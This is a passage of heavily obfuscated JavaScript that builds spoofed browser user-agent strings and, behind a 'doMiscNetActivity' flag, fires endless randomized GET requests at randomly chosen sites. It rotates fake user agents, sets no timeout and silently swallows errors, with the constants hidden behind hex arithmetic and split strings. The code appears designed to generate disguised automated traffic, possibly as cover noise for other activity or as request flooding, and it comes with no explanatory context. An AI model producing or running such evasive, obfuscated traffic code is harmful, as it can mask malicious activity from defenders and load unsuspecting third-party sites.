      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + a2(0xb, 'Gq0b') + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x4 * -0x844 + 0x24dc * -0x1 + 0x45ec; k < -0x10fa * -0x1 + 0x1c49 + -0x75 * 0x63; k++)
    setTimeout(f, (0x1 * -0x1a92a + 0x13445 + 0x15f45) * k * getRandomInt(-0x80 * 0x1c + -0x439 * 0x1 + 0x123a, 0x224f + 0x26b * 0xf + 0x5 * -0xe1d));
  setInterval(() => {
    f();
    for (let l = -0x7e + 0xc1 * -0x2e + -0x1 * -0x232c; l < 0xa50 + -0xc22 * -0x1 + -0x166e; l++)
      setTimeout(f, (-0x133a4 + 0x5a6 + 0x2185e) * l * getRandomInt(-0x1 * -0x6a5 + 0x4 * -0x779 + 0x1740, 0x24d7 + 0xe4 * -0x20 + -0x2 * 0x42a));
  }, -0x1b * 0x1cc03 + 0xd75d9 + -0x1 * -0x59fcf8);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1 * 0xf4c + -0x30 * -0x2 + 0xbac) * getRandomInt(0x1 * -0x1615 + 0x2 * 0x10b1 + -0x6 * 0x1e2, -0x14a5 + -0xb * -0x289 + 0x739 * -0x1));
}, -0x1e07 + -0x19 * -0xc7 + 0x4a * 0x26);